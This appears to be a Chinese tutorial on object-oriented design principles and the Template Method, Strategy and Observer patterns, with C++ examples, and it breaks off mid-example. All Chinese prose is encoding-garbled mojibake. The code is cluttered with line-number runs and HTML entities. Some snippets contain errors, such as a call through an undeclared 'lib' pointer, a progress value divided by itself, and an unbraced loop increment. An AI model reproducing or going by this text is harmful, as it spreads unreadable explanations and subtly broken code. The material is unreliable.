ä»æ¦‚å¿µå±‚é¢è®²ï¼Œå¯¹è±¡æ˜¯æŸç§æ‹¥æœ‰è´£ä»»çš„æŠ½è±¡ã€‚ ä¸€èˆ¬æœ¯è¯­çš„å«ä¹‰ è¿è¡Œæ—¶ï¼šç¨‹åºå·²ç»è¢«ç¼–è¯‘ï¼ŒåŠ è½½åˆ°å†…å­˜ä¸­çš„äºŒè¿›åˆ¶å½¢å¼ã€‚ æ‰©å±•ï¼šä¸€èˆ¬æ¥è®²ï¼Œå°±æ˜¯å»ºç«‹æ–°çš„å­ç±»ï¼Œoverrideçˆ¶ç±»ä¸­æä¾›å˜åŒ–çš„æ¥å£æ–¹æ³•ã€‚ ç¨³å®šï¼šä¸€èˆ¬æŒ‡ä»£ç è¢«ç¼–è¯‘æˆäºŒè¿›åˆ¶ä¹‹åï¼Œä¸ä¼šå†æ”¹å˜ï¼ˆæˆ–è€…è¯´å¾ˆå°‘æ”¹å˜ï¼‰ã€‚ä¸æ˜¯è¯´ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ï¼Œæ²¡æœ‰æ”¹å˜çš„ä»£ç ç‰‡æ®µã€‚ å˜åŒ–ï¼šä¸€èˆ¬æ—¶ç¨‹åºä¸­ï¼Œä¼šéšç€éœ€æ±‚ã€åœºæ™¯ã€æ—¶é—´ç­‰é¢‘ç¹åˆ‡æ¢æˆ–è€…æ”¹å˜ã€‚è¿™éƒ¨åˆ†ä¼šç»å¸¸è¦æ±‚é‡æ–°ç¼–è¯‘ã€‚ ä¸å¯ä¿®æ”¹ï¼šä¸€èˆ¬å°±æ˜¯æŒ‡æºä»£ç ä¸ä¼šæ›´æ”¹ã€‚ æ¥å£ï¼šä¸€ä¸ªç±»ï¼ˆæŠ½è±¡åŸºç±»ï¼‰å¯¹å¤–å¼€æ”¾çš„æ–¹æ³•ï¼Œä¸€èˆ¬ä¼šæœ‰ç»Ÿä¸€çš„è®¾è®¡å‡†åˆ™ã€‚ ç»‘å®šï¼šä¸€èˆ¬å°±æ˜¯æŒ‡è°ƒç”¨å…³ç³»ï¼Œä¸€ä¸ªç±»ä¸­çš„æ–¹æ³•ä¼šè°ƒç”¨åˆ°å¦ä¸€ä¸ªç±»ä¸­çš„æ–¹æ³•å®ç°ã€‚ç±»é—´å¯ä»¥ä¸ºçˆ¶å­å…³ç³»ã€‚ åŸåˆ™ ä¾èµ–å€’ç½®åŸåˆ™ï¼ˆDIPï¼‰ é«˜å±‚æ¨¡å—(ç¨³å®š)ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¨¡å—(å˜åŒ–)ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡(ç¨³å®š) ã€‚ æŠ½è±¡(ç¨³å®š)ä¸åº”è¯¥ä¾èµ–äºå®ç°ç»†èŠ‚(å˜åŒ–) ï¼Œå®ç°ç»†èŠ‚åº”è¯¥ä¾èµ–äºæŠ½è±¡(ç¨³å®š)ã€‚ å¼€æ”¾å°é—­åŸåˆ™ï¼ˆOCPï¼‰ å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹æ›´æ”¹å°é—­ ç±»æ¨¡å—åº”è¯¥æ˜¯å¯æ‰©å±•çš„ï¼Œä½†æ˜¯ä¸å¯ä¿®æ”¹ å•ä¸€èŒè´£åŸåˆ™ï¼ˆSRPï¼‰ ä¸€ä¸ªç±»åº”è¯¥ä»…æœ‰ä¸€ä¸ªå¼•èµ·å®ƒå˜åŒ–çš„åŸå›  å˜åŒ–çš„æ–¹å‘éšå«ç€ç±»çš„è´£ä»» Liskov æ›¿æ¢åŸåˆ™ï¼ˆLSPï¼‰ å­ç±»å¿…é¡»èƒ½å¤Ÿæ›¿æ¢å®ƒä»¬çš„åŸºç±»(IS-A) ç»§æ‰¿è¡¨è¾¾ç±»å‹æŠ½è±¡ æ¥å£éš”ç¦»åŸåˆ™ï¼ˆISPï¼‰ ä¸åº”è¯¥å¼ºè¿«å®¢æˆ·ç¨‹åºä¾èµ–å®ƒä»¬ä¸ç”¨çš„æ–¹æ³• æ¥å£åº”è¯¥å°è€Œå®Œå¤‡ ä¼˜å…ˆä½¿ç”¨å¯¹è±¡ç»„åˆï¼Œè€Œä¸æ˜¯ç±»ç»§æ‰¿ ç±»ç»§æ‰¿é€šå¸¸ä¸ºâ€œç™½ç®±å¤ç”¨â€ï¼Œå¯¹è±¡ç»„åˆé€šå¸¸ä¸ºâ€œé»‘ç®±å¤ç”¨â€ ç»§æ‰¿åœ¨æŸç§ç¨‹åº¦ä¸Šç ´åäº†å°è£…æ€§ï¼Œå­ç±»çˆ¶ç±»è€¦åˆåº¦é«˜ è€Œå¯¹è±¡ç»„åˆåˆ™åªè¦æ±‚è¢«ç»„åˆçš„å¯¹è±¡å…·æœ‰è‰¯å¥½å®šä¹‰çš„æ¥å£ï¼Œè€¦åˆåº¦ä½ å°è£…å˜åŒ–ç‚¹ ä½¿ç”¨å°è£…æ¥åˆ›å»ºå¯¹è±¡ä¹‹é—´çš„åˆ†ç•Œå±‚ï¼Œè®©è®¾è®¡è€…å¯ä»¥åœ¨åˆ†ç•Œå±‚çš„ä¸€ä¾§è¿›è¡Œä¿®æ”¹ï¼Œè€Œä¸ä¼šå¯¹å¦ä¸€ä¾§äº§ç”Ÿä¸è‰¯çš„å½±å“ï¼Œä»è€Œå®ç°å±‚æ¬¡é—´çš„æ¾è€¦åˆã€‚ é’ˆå¯¹æ¥å£ç¼–ç¨‹ï¼Œè€Œä¸æ˜¯é’ˆå¯¹å®ç°ç¼–ç¨‹ ä¸å°†å˜é‡ç±»å‹å£°æ˜ä¸ºæŸä¸ªç‰¹å®šçš„å…·ä½“ç±»ï¼Œè€Œæ˜¯å£°æ˜ä¸ºæŸä¸ªæ¥å£ å®¢æˆ·ç¨‹åºæ— éœ€è·çŸ¥å¯¹è±¡çš„å…·ä½“ç±»å‹ï¼Œåªéœ€è¦çŸ¥é“å¯¹è±¡æ‰€å…·æœ‰çš„æ¥å£ å‡å°‘ç³»ç»Ÿä¸­å„éƒ¨åˆ†çš„ä¾èµ–å…³ç³»ï¼Œä»è€Œå®ç°â€œé«˜å†…èšã€æ¾è€¦åˆâ€çš„ç±»å‹è®¾è®¡æ–¹æ¡ˆ å¾ˆæŠ½è±¡çš„æ€»ç»“ï¼Œç»“åˆå…·ä½“æ¨¡å¼ä½“ä¼šã€‚ åˆ†ç±» ä»ç›®çš„æ¥çœ‹ï¼š åˆ›å»ºå‹ï¼ˆCreationalï¼‰æ¨¡å¼ï¼šå°†å¯¹è±¡çš„éƒ¨åˆ†åˆ›å»ºå·¥ä½œå»¶è¿Ÿåˆ°å­ç±»æˆ–è€…å…¶ä»–å¯¹è±¡ï¼Œä»è€Œåº”å¯¹éœ€æ±‚å˜åŒ–ä¸ºå¯¹è±¡åˆ›å»ºæ—¶å…·ä½“ç±»å‹å®ç°å¼•æ¥çš„å†²å‡»ã€‚ ç»“æ„å‹ï¼ˆStructuralï¼‰æ¨¡å¼ï¼šé€šè¿‡ç±»ç»§æ‰¿æˆ–è€…å¯¹è±¡ç»„åˆè·å¾—æ›´çµæ´»çš„ç»“æ„ï¼Œä»è€Œåº”å¯¹éœ€æ±‚å˜åŒ–ä¸ºå¯¹è±¡çš„ç»“æ„å¸¦æ¥çš„å†²å‡»ã€‚ è¡Œä¸ºå‹ï¼ˆBehavioralï¼‰æ¨¡å¼ï¼šé€šè¿‡ç±»ç»§æ‰¿æˆ–è€…å¯¹è±¡ç»„åˆæ¥åˆ’åˆ†ç±»ä¸å¯¹è±¡é—´çš„èŒè´£ï¼Œä»è€Œåº”å¯¹éœ€æ±‚å˜åŒ–ä¸ºå¤šä¸ªäº¤äº’çš„å¯¹è±¡å¸¦æ¥çš„å†²å‡»ã€‚ ä»èŒƒå›´æ¥çœ‹ï¼š ç±»æ¨¡å¼å¤„ç†ç±»ä¸å­ç±»çš„é™æ€å…³ç³»ã€‚ å¯¹è±¡æ¨¡å¼å¤„ç†å¯¹è±¡é—´çš„åŠ¨æ€å…³ç³»ã€‚ ä»å°è£…å˜åŒ–è§’åº¦å¯¹æ¨¡å¼åˆ†ç±»ï¼š ç»„ä»¶åä½œï¼š â€¢ Template Method â€¢ Observer / Event â€¢ Strategy å•ä¸€èŒè´£ï¼š â€¢ Decorator â€¢ Bridge å¯¹è±¡åˆ›å»º: â€¢ Factory Method â€¢ Abstract Factory â€¢ Prototype â€¢ Builder å¯¹è±¡æ€§èƒ½ï¼š â€¢ Singleton â€¢ Flyweight æ¥å£éš”ç¦»: â€¢ FaÃ§ade â€¢ Proxy â€¢ Mediator â€¢ Adapter çŠ¶æ€å˜åŒ–ï¼š â€¢ Memento â€¢ State æ•°æ®ç»“æ„ï¼š â€¢ Composite â€¢ Iterator â€¢ Chain of Responsibility è¡Œä¸ºå˜åŒ–ï¼š â€¢ Command â€¢ Visitor é¢†åŸŸé—®é¢˜ï¼š â€¢ Interpreter ç°ä»£è½¯ä»¶è®¾è®¡çš„ç‰¹å¾æ˜¯â€œéœ€æ±‚çš„é¢‘ç¹å˜åŒ–â€ã€‚è®¾è®¡æ¨¡å¼çš„è¦ç‚¹æ˜¯â€œå¯»æ‰¾å˜åŒ–ç‚¹ï¼Œç„¶ååœ¨å˜åŒ–ç‚¹å¤„åº”ç”¨è®¾è®¡æ¨¡å¼ï¼Œä»è€Œæ¥æ›´å¥½åœ°åº”å¯¹éœ€æ±‚çš„å˜åŒ–â€ã€‚â€œä»€ä¹ˆæ—¶å€™ã€ä»€ä¹ˆåœ°ç‚¹åº”ç”¨è®¾è®¡æ¨¡å¼â€æ¯”â€œç†è§£è®¾è®¡æ¨¡å¼ç»“æ„æœ¬èº«â€æ›´ä¸ºé‡è¦ã€‚ è®¾è®¡æ¨¡å¼çš„åº”ç”¨ä¸å®œå…ˆå…¥ä¸ºä¸»ï¼Œä¸€ä¸Šæ¥å°±ä½¿ç”¨è®¾è®¡æ¨¡å¼æ˜¯å¯¹è®¾è®¡æ¨¡å¼çš„æœ€å¤§è¯¯ç”¨ã€‚æ²¡æœ‰ä¸€æ­¥åˆ°ä½çš„è®¾è®¡æ¨¡å¼ã€‚æ•æ·è½¯ä»¶å¼€å‘å®è·µæå€¡çš„â€œRefactoring to Patternsâ€æ˜¯ç›®å‰æ™®éå…¬è®¤çš„æœ€å¥½çš„ä½¿ç”¨è®¾è®¡æ¨¡å¼çš„æ–¹æ³•ã€‚ é‡æ„æŠ€æ³• é™æ€ è½¬ åŠ¨æ€ æ—©ç»‘å®š è½¬ æ™šç»‘å®š ç»§æ‰¿ è½¬ ç»„åˆ ç¼–è¯‘æ—¶ä¾èµ– è½¬ è¿è¡Œæ—¶ä¾èµ– ç´§è€¦åˆ è½¬ æ¾è€¦åˆ è™½ç„¶è¡¨è¿°ä¸Šä¸åŒï¼Œä½†æ˜¯å®è´¨ä¸Šæ„æ€æ˜¯ç±»ä¼¼çš„ã€‚ ç»„ä»¶åä½œç›¸å…³æ¨¡å¼ ç°ä»£è½¯ä»¶ä¸“ä¸šåˆ†å·¥ä¹‹åçš„ç¬¬ä¸€ä¸ªç»“æœæ˜¯â€œæ¡†æ¶ä¸åº”ç”¨ç¨‹åºçš„åˆ’åˆ†â€ï¼Œâ€œç»„ä»¶åä½œâ€æ¨¡å¼é€šè¿‡æ™šç»‘å®šï¼ˆçˆ¶ç±»ä¸­è°ƒç”¨å­ç±»çš„æ–¹æ³•å®ç°ï¼Œè™šå‡½æ•°å®ç°ï¼‰ï¼Œæ¥å®ç°æ¡†æ¶ä¸åº”ç”¨ç¨‹åºä¹‹é—´çš„æ¾è€¦åˆï¼Œæ˜¯äºŒè€…ä¹‹é—´åä½œæ—¶å¸¸ç”¨çš„æ¨¡å¼ã€‚ å…¸å‹æ¨¡å¼ï¼š Template Method Observer / Event Strategy Template Method å¯¹äºæŸä¸€é¡¹ä»»åŠ¡ï¼Œå®ƒå¸¸å¸¸æœ‰ç¨³å®šçš„æ•´ä½“æ“ä½œç»“æ„ï¼Œä½†å„ä¸ªå­æ­¥éª¤å´æœ‰å¾ˆå¤šæ”¹å˜çš„éœ€æ±‚ï¼Œæˆ–è€…ç”±äºå›ºæœ‰çš„åŸå› ï¼ˆæ¯”å¦‚æ¡†æ¶ä¸åº”ç”¨ä¹‹é—´çš„å…³ç³»ï¼‰è€Œæ— æ³•å’Œä»»åŠ¡çš„æ•´ä½“ç»“æ„åŒæ—¶å®ç°ã€‚ åœ¨ç¡®å®šç¨³å®šæ“ä½œç»“æ„çš„å‰æä¸‹ï¼Œæ¥çµæ´»åº”å¯¹å„ä¸ªå­æ­¥éª¤çš„å˜åŒ–æˆ–è€…æ™šæœŸå®ç°éœ€æ±‚ã€‚ ç¤ºä¾‹2 è®¾è®¡ä¸€ä¸ªlibraryï¼Œæ”¯æŒapplicationåœ¨ä½¿ç”¨æ—¶å¯ä»¥è‡ªå®šä¹‰æ¡†æ¶ä¸­çš„æŸäº›æ­¥éª¤ã€‚ å®ç°ä¸€ï¼ŒApplicationå®ç°è¿‡ç¨‹è¿˜éœ€è¦å®Œæˆmainå‡½æ•°ä¸­è°ƒç”¨libraryï¼Œå¹¶å®Œæˆç®—æ³•é€»è¾‘çš„è¿‡ç¨‹ã€‚ 123456789101112131415161718192021222324252627class Library&#123;public: void Step1()&#123;...&#125; void Step3()&#123;...&#125; void Step5()&#123;...&#125;&#125;;class Application&#123;public: bool Step2()&#123;...&#125; void Step4()&#123;...&#125;&#125;;int main()&#123; Library lib(); Application app(); lib.Step1(); if (app.Step2())&#123; lib.Step3(); &#125; for (int i = 0; i &lt; 4; i++)&#123; app.Step4(); &#125; lib.Step5();&#125; å®ç°äºŒï¼Œåˆ©ç”¨è™šå‡½æ•°ï¼Œå°†å›ºå®šçš„ç®—æ³•é€»è¾‘åœ¨libä¸­å®ç°ï¼Œè¿è¡Œæ—¶è°ƒç”¨Appä¸­å®ç°çš„overrideçš„è‡ªå®šä¹‰æ­¥éª¤ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940class Library&#123;public: //ç¨³å®š template method void Run()&#123; Step1(); if (Step2()) Step3(); for (int i = 0; i &lt; 4; i++) Step4(); Step5(); &#125; virtual ~Library()&#123; &#125;protected: void Step1() &#123; ç¨³å®š &#125; void Step3() &#123; ç¨³å®š &#125; void Step5() &#123; ç¨³å®š &#125; // ä¸€èˆ¬è®¾ç½®ä¸ºprotected virtual bool Step2() = 0;//å˜åŒ–,è™šå‡½æ•°çš„å¤šæ€è°ƒç”¨ virtual void Step4() =0; //å˜åŒ–&#125;;class Application : public Library &#123;protected: virtual bool Step2()&#123; //... å­ç±»é‡å†™å®ç° &#125; virtual void Step4() &#123; //... å­ç±»é‡å†™å®ç° &#125;&#125;;int main()&#123; Library* pLib=new Application(); lib-&gt;Run(); delete pLib;&#125; å®é™…ä¸Šå°±æ˜¯ä¸ªè™šå‡½æ•°çš„åº”ç”¨ã€‚è¿™é‡Œçš„ç¬¬ä¸€ç§ä¸ºæ—©ç»‘å®šï¼Œåœ¨appç¨‹åºä¸­ï¼Œå®ç°å›ºå®šä¸å˜çš„æµç¨‹ï¼Œå¹¶è°ƒç”¨libä¸­çš„æ–¹æ³•ã€‚ç¬¬äºŒç§æ˜¯æ™šç»‘å®šï¼Œå›ºå®šæµç¨‹å®ç°åœ¨libä¸­ï¼Œappåªå…³å¿ƒå˜åŒ–çš„éƒ¨åˆ†ï¼Œå®ç°è‡ªå®šä¹‰çš„æ–¹æ³•å³å¯ï¼Œä»libä¸­å»¶è¿Ÿè°ƒç”¨appå®ç°çš„è‡ªå®šä¹‰æ–¹æ³•ã€‚ ConcreteClassé AbstractClassæ¥å®ç°ç®—æ³•ä¸­ä¸å˜çš„æ­¥éª¤ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;/* * AbstractClass * implements a template method defining the skeleton of an algorithm */class AbstractClass&#123;public: virtual ~AbstractClass() &#123;&#125; void templateMethod() &#123; // ... primitiveOperation1(); // ... primitiveOperation2(); // ... &#125; virtual void primitiveOperation1() = 0; virtual void primitiveOperation2() = 0; // ...&#125;;/* * Concrete Class * implements the primitive operations to carry out specific steps * of the algorithm, there may be many Concrete classes, each implementing * the full set of the required operation */class ConcreteClass : public AbstractClass&#123;public: ~ConcreteClass() &#123;&#125; void primitiveOperation1() &#123; std::cout &lt;&lt; \"Primitive operation 1\" &lt;&lt; std::endl; // ... &#125; void primitiveOperation2() &#123; std::cout &lt;&lt; \"Primitive operation 2\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;int main()&#123; AbstractClass *tm = new ConcreteClass; tm-&gt;templateMethod(); delete tm; return 0;&#125; Strategy åœ¨è½¯ä»¶æ„å»ºè¿‡ç¨‹ä¸­ï¼ŒæŸäº›å¯¹è±¡ä½¿ç”¨çš„ç®—æ³•å¯èƒ½å¤šç§å¤šæ ·ï¼Œç»å¸¸æ”¹å˜ï¼Œå¦‚æœå°†è¿™äº›ç®—æ³•éƒ½ç¼–ç åˆ°å¯¹è±¡ä¸­ï¼Œå°†ä¼šä½¿å¯¹è±¡å˜å¾—å¼‚å¸¸å¤æ‚ï¼›è€Œä¸”æœ‰æ—¶å€™æ”¯æŒä¸ä½¿ç”¨çš„ç®—æ³•ä¹Ÿæ˜¯ä¸€ä¸ªæ€§èƒ½è´Ÿæ‹…ã€‚ Strategyå°†ç®—æ³•ä¸å¯¹è±¡æœ¬èº«è§£è€¦ã€‚ Strategyè¡¨è¿°ä¸ºï¼š å®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä¸”ä½¿å®ƒä»¬å¯äº’ç›¸æ›¿æ¢ï¼ˆå˜åŒ–ï¼‰ã€‚è¯¥æ¨¡å¼ä½¿å¾—ç®—æ³•å¯ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„å®¢æˆ·ç¨‹åº(ç¨³å®š)è€Œå˜åŒ–ï¼ˆæ‰©å±•ï¼Œå­ç±»åŒ–ï¼‰ã€‚ ç¤ºä¾‹3 è®¾è®¡ä¸€ä¸ªè®¡ç¨ç¨‹åºï¼Œæ ¹æ®ä¸åŒå›½å®¶ç¨æ³•ï¼Œè¿›è¡Œè®¡ç®—ã€‚ æ–¹æ³•ä¸€ï¼Œä½¿ç”¨ if else ç»“æ„ï¼Œå°†ä¸åŒæ–¹æ³•æ•´åˆå†ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚ 12345678910111213141516171819202122enum TaxBase &#123; CN_Tax, US_Tax, DE_Tax, FR_Tax //æ‰©å±•&#125;;class SalesOrder&#123; TaxBase tax;public: double CalculateTax()&#123; ... if (tax == CN_Tax)&#123;...&#125; else if (tax == US_Tax)&#123;...&#125; else if (tax == DE_Tax)&#123;...&#125; // æ‰©å±•æ›´å¤šæƒ…å†µï¼Œéœ€è¦ä¿®æ”¹æºä»£ç ï¼Œé‡æ–°ç¼–è¯‘ else if (tax == FR_Tax)&#123; ... &#125; ... &#125;&#125;; æ–¹æ³•äºŒï¼Œä½¿ç”¨ç±»å®ç°ä¸åŒç­–ç•¥ï¼Œåœ¨åº”ç”¨ç¨‹åºéƒ¨åˆ†å®ç°ä¸å˜åŒ–çš„éƒ¨åˆ†ã€‚ 12345678910111213141516171819202122232425262728// ç­–ç•¥åŸºç±»class TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)=0; virtual ~TaxStrategy()&#123;&#125;&#125;;class CNTax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;;class USTax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;;class DETax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;;//æ‰©å±•æ–°ç­–ç•¥class FRTax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;; 1234567891011121314151617181920// ç¨³å®šçš„æµç¨‹éƒ¨åˆ†class SalesOrder&#123;private: TaxStrategy* strategy;public: SalesOrder(StrategyFactory* strategyFactory)&#123; this-&gt;strategy = strategyFactory-&gt;NewStrategy(); &#125; ~SalesOrder()&#123; delete this-&gt;strategy; &#125; public double CalculateTax()&#123; //... Context context(); double val = strategy-&gt;Calculate(context); //å¤šæ€è°ƒç”¨ //... &#125;&#125;; å®ç°ä¸åŒç­–ç•¥ç±»ï¼Œé€šè¿‡å·¥å‚æ¨¡å¼ä¼ å…¥ç­–ç•¥ï¼Œä¿æŒäº†ç¨³å®šçš„æµç¨‹éƒ¨åˆ†ä¸ä¼šæ”¹å˜ã€‚ è¿™é‡Œçš„ä»£ç æ•´åˆåˆ°äº†ä¸€èµ·ï¼Œå®é™…ä¸Šæ˜¯åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ã€‚ ä¸€èˆ¬if elseæ¶‰åŠå¤šç§åœºæ™¯åˆ‡æ¢ä¸”å¯èƒ½å‡ºç°æ‰©å±•éœ€æ±‚çš„åœ°æ–¹ï¼Œéƒ½å¯ä»¥è€ƒè™‘ä½¿ç”¨strategyæ¨¡å¼ã€‚æ›´å¤šçš„strategyå¯¹è±¡ï¼Œå¯èƒ½å­˜åœ¨ä¸€äº›é¢å¤–çš„å¼€é”€ï¼Œå¯ä»¥è€ƒè™‘è®¾è®¡ä¸ºsingletonæ¨¡å¼ã€‚è¿™æ ·ä¸åŒçš„contextä¹Ÿå¯ä»¥å…±äº«ä¸€ä¸ªstrategyå¯¹è±¡ï¼ŒèŠ‚çœäº†å¼€é”€ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;iostream&gt;/* * Strategy * declares an interface common to all supported algorithms */class Strategy&#123;public: virtual ~Strategy() &#123; /* ... */ &#125; virtual void algorithmInterface() = 0; // ...&#125;;/* * Concrete Strategies * implement the algorithm using the Strategy interface */class ConcreteStrategyA : public Strategy&#123;public: ~ConcreteStrategyA() &#123; /* ... */ &#125; void algorithmInterface() &#123; std::cout &lt;&lt; \"Concrete Strategy A\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteStrategyB : public Strategy&#123;public: ~ConcreteStrategyB() &#123; /* ... */ &#125; void algorithmInterface() &#123; std::cout &lt;&lt; \"Concrete Strategy B\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteStrategyC : public Strategy&#123;public: ~ConcreteStrategyC() &#123; /* ... */ &#125; void algorithmInterface() &#123; std::cout &lt;&lt; \"Concrete Strategy C\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Context * maintains a reference to a Strategy object */class Context&#123;public: Context( Strategy* const s ) : strategy( s ) &#123;&#125; ~Context() &#123; delete strategy; &#125; void contextInterface() &#123; strategy-&gt;algorithmInterface(); &#125; // ...private: Strategy *strategy; // ...&#125;;int main()&#123; Context context( new ConcreteStrategyA() ); context.contextInterface(); return 0;&#125; Observer åœ¨è½¯ä»¶æ„å»ºè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºæŸäº›å¯¹è±¡å»ºç«‹ä¸€ç§â€œé€šçŸ¥ä¾èµ–å…³ç³»â€ â€”â€”ä¸€ä¸ªå¯¹è±¡ï¼ˆç›®æ ‡å¯¹è±¡ï¼‰çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œæ‰€æœ‰çš„ä¾èµ–å¯¹è±¡ï¼ˆè§‚å¯Ÿè€…å¯¹è±¡ï¼‰éƒ½å°†å¾—åˆ°é€šçŸ¥ã€‚ å®šä¹‰æè¿°ï¼š å®šä¹‰å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šï¼ˆå˜åŒ–ï¼‰çš„ä¾èµ–å…³ç³»ï¼Œä»¥ä¾¿å½“ä¸€ä¸ªå¯¹è±¡(Subject)çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½å¾—åˆ°é€šçŸ¥å¹¶è‡ªåŠ¨æ›´æ–°ã€‚ æ¯”å¦‚ï¼Œå½“ç”¨æˆ·æ”¹å˜è¡¨æ ¼ä¸­çš„ä¿¡æ¯æ—¶, æŸ±çŠ¶å›¾èƒ½ç«‹å³åæ˜ è¿™ä¸€å˜åŒ–ã€‚ ç¤ºä¾‹4 åœ¨ä¸€ä¸ªå¤§æ–‡ä»¶åˆ‡åˆ†ä¸ºå°æ–‡ä»¶å‚¨å­˜çš„è¿‡ç¨‹ä¸­ï¼Œå¢åŠ ä¸åŒçš„è¿›åº¦æ¡æ˜¾ç¤ºã€‚ æ–¹æ³•ä¸€ï¼Œç›´æ¥åœ¨FileSpliterç±»ä¸­ï¼Œè°ƒç”¨è¿›åº¦æ¡ç®¡ç†å¯¹è±¡ã€‚ 1234567891011121314151617181920212223class FileSplitter&#123; string m_filePath; int m_fileNumber; ProgressBar* m_progressBar; // ç›´æ¥è°ƒç”¨å…·ä½“çš„è¿›åº¦æ¡ç®¡ç†å¯¹è±¡public: FileSplitter(const string&amp; filePath, int fileNumber, ProgressBar* progressBar) : m_filePath(filePath), m_fileNumber(fileNumber), m_progressBar(progressBar)&#123;...&#125; void split()&#123; ... // ç›´æ¥è°ƒç”¨å…·ä½“å¯¹è±¡æ–¹æ³•ï¼Œæ›´æ–°è¿›åº¦æ¡ for (int i = 0; i &lt; m_fileNumber; i++)&#123; //... progressValue = (i + 1) / (float)progressValue; m_progressBar-&gt;setValue(progressValue); &#125; ... &#125;&#125;; 1234567891011121314151617class MainForm : public Form&#123; TextBox* txtFilePath; TextBox* txtFileNumber; ProgressBar* progressBar;public: void Button1_Click()&#123; string filePath = txtFilePath-&gt;getText(); int number = atoi(txtFileNumber-&gt;getText().c_str()); // å…·ä½“å¯¹è±¡ä¼ å…¥ FileSplitter splitter(filePath, number, progressBar); splitter.split(); &#125;&#125;; ä»¥ä¸Šå®ç°ï¼ŒFileSplitterä¸èƒ½ä¼ å…¥å…¶å®ƒç±»å‹çš„è¿›åº¦æ¡å¯¹è±¡ã€‚ä¸ç¬¦åˆä¾èµ–å€’ç½®åŸåˆ™ã€‚ é«˜å±‚æ¨¡å—(ç¨³å®š)ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¨¡å—(å˜åŒ–)ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡(ç¨³å®š) ã€‚ æŠ½è±¡(ç¨³å®š)ä¸åº”è¯¥ä¾èµ–äºå®ç°ç»†èŠ‚(å˜åŒ–) ï¼Œå®ç°ç»†èŠ‚åº”è¯¥ä¾èµ–äºæŠ½è±¡(ç¨³å®š)ã€‚ è¦æ”¹ï¼Œå°±æ˜¯å°†å…·ä½“è¿›åº¦æ¡å¯¹è±¡ï¼Œæƒ³åŠæ³•å˜æˆä¸€ä¸ªæŠ½è±¡çš„çˆ¶ç±»å¯¹è±¡ã€‚ æ–¹æ³•äºŒï¼Œä½¿ç”¨observerï¼ŒæŠ½è±¡ä¸€ä¸ªIProgressåŸºç±»å¯¹è±¡ï¼Œè®©FileSpliterä¾èµ–å®ƒã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// observerclass IProgress&#123;public: // update virtual void DoProgress(float value)=0; virtual ~IProgress()&#123;&#125;&#125;;// subjectclass FileSplitter&#123; string m_filePath; int m_fileNumber; List&lt;IProgress*&gt; m_iprogressList; // æŠ½è±¡é€šçŸ¥æœºåˆ¶ï¼Œæ”¯æŒå¤šä¸ªè§‚å¯Ÿè€… public: FileSplitter(const string&amp; filePath, int fileNumber) : m_filePath(filePath), m_fileNumber(fileNumber)&#123;...&#125; // è°ƒç”¨notifier: æ‰€æœ‰å…·ä½“observerï¼Œæ›´æ–°çŠ¶æ€ï¼Œæ­¤å¤„ä¸ä¾èµ–å…·ä½“å¯¹è±¡ void split()&#123; ... for (int i = 0; i &lt; m_fileNumber; i++)&#123; progressValue = (i + 1) / (float)progressValue; onProgress(progressValue); //å‘é€é€šçŸ¥ &#125; ... &#125; // attach observer void addIProgress(IProgress* iprogress)&#123; m_iprogressList.push_back(iprogress); &#125; // detach observer void removeIProgress(IProgress* iprogress)&#123; m_iprogressList.remove(iprogress); &#125;protected: // notify virtual void onProgress(float value)&#123; List&lt;IProgress*&gt;::iterator itor=m_iprogressList.begin(); while (itor != m_iprogressList.end() ) (*itor)-&gt;DoProgress(value); //è°ƒç”¨observeræ›´æ–°è¿›åº¦æ¡ itor++; &#125; &#125;&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142// ä¸€ç§å…·ä½“observerclass ConsoleObserver: public IProgress &#123;public: virtual void DoProgress(float value)&#123; cout &lt;&lt; \".\"; &#125;&#125;;// å…·ä½“å¯¹è±¡ä½¿ç”¨observerè¿›è¡Œé€šçŸ¥class MainForm : public Form, public IProgress&#123; TextBox* txtFilePath; TextBox* txtFileNumber; ProgressBar* progressBar;public: void Button1_Click()&#123; string filePath = txtFilePath-&gt;getText(); int number = atoi(txtFileNumber-&gt;getText().c_str()); // å…·ä½“observer ConsoleObserver ob1; // å…·ä½“subject FileSplitter splitter(filePath, number); // æ·»åŠ observer splitter.addIProgress(this); //è®¢é˜…é€šçŸ¥ splitter.addIProgress(&amp;ob1)ï¼› //è®¢é˜…é€šçŸ¥ // observerå°†æ ¹æ®subjectçŠ¶æ€çš„æ”¹å˜ï¼Œæ›´æ–°è‡ªå·±çŠ¶æ€ splitter.split(); 